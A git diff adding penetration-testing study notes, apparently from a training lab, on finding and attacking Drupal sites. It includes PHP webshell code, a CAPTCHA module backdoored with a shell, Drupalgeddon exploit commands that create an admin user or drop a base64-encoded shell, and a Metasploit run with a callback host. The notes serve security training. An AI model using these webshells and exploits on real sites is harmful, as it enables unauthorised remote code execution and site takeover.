@@ -254,3 +254,148 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); # randomness added to prevent
 curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
 - Remember to remove webshell after recording the vulnerability
+
+## Drupal
+
+### Discovery
+
+- "Powered by Drupal" header/footer
+- Standard Drupal logo
+- The presence of a CHANGELOG.txt file or README.txt file, via the page source
+- Clues in the robots.txt file such as references to /node
+- grep search:
+```bash
+curl -s http://drupal.inlanefreight.local | grep Drupal
+```
+- References to [nodes](https://www.drupal.org/docs/core-modules-and-themes/core-modules/node-module/about-nodes): ```http://drupal.inlanefreight.local/node/1```
+
+### Enumeration
+
+- Drupal supports three types of users by default:
+    - Administrator: This user has complete control over the Drupal website.
+    - Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
+    - Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
+
+- Output first two lines of CHANGELOG.txt to see the version in use (will return 404 on latest versions):
+```bash
+curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+```
+- use droopscan:
+```bash
+droopescan scan drupal -u http://drupal.inlanefreight.local
+```
+
+### Attacking Drupal
+
+#### Leveraging the PHP Filter Module
+
+- Log in as admin
+- Enable the PHP filter module by ticking the check box next to the module and scroll down to Save configuration
+- Go to Content --> Add content and create a Basic page
+- Create malicious page:
+```php
+<?php
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+?>
+```
+- Set Text format drop-down to PHP code
+- Click Save
+- Check function of reverse shell
+```bash
+curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+```
+
+- From version 8 onwards the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module requires installing first:
+```bash
+wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+```
+- May need to adjust above command for most recent version
+- Once downloaded go to ```Administration > Reports > Available updates``` (location may differ)
+- ```Browse``` to select downloaded file and click ```Install```
+- Once installed click ```Content``` to create basic page like before
+- Post pentest delete any installed modules and created pages
+
+#### Uploading a Backdoored Module
+
+- Add a shell to an existing module
+- Example using the CAPTCHA module
+- Download module
+```bash
+wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+tar xvf captcha-8.x-1.2.tar.gz
+```
+Create a webshell file:
+```php
+<?php
+system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
+?>
+```
+Create a .htaccess file to give ourselves access to the folder
+```html
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+- Copy created files to the captcha folder
+```bash
+mv shell.php .htaccess captcha
+tar cvf captcha.tar.gz captcha/
+```
+- Login to site with admin access
+- Click on ```Manage``` and then ```Extend``` on the sidebar
+- Click on the ```+ Install new module``` button
+- Browse to the backdoored Captcha archive and click ```Install```
+- Browse to ```/modules/captcha/shell.php``` to execute commands
+```bash
+curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+```
+
+#### Drupalgeddon
+
+- Affects versions 7.0 up to 7.31
+- Used to upload a malicious form or create a new admin user
+- [PoC](https://www.exploit-db.com/exploits/34992)
+- Supply the target URL and a username and password for our new admin account
+```bash
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+```
+
+#### Drupalgeddon2
+
+- Affects versions prior to 7.58 and 8.5.1
+- Allows system-level commands to be maliciously injected
+- [PoC](https://www.exploit-db.com/exploits/44448)
+- Replace the echo command in the exploit script with a command to write out our malicious PHP script (and references to hello.txt):
+```bash
+echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+```
+- Run module and fill in relevant details to upload shell
+```bash
+python3 drupalgeddon2.py
+...
+Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
+Check: http://drupal-dev.inlanefreight.local/mrb3n.php
+```
+- Confirm RCE
+```bash
+curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+```
+
+#### Drupalgeddon3
+
+- Affects multiple versions of Drupal 7.x and 8.x 
+- RCE vulnerability that exploits improper validation in the Form API
+- Requires a user to have the ability to delete a node
+- Log in and obtain a valid session cookie
+- Load metasploit and add required options
+```bash
+msfconsole
+use multi/http/drupal_drupageddon3
+set rhosts 10.129.42.195
+set VHOST drupal-acc.inlanefreight.local   
+set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
+set DRUPAL_NODE 1
+set LHOST 10.10.14.15
+exploit
+```
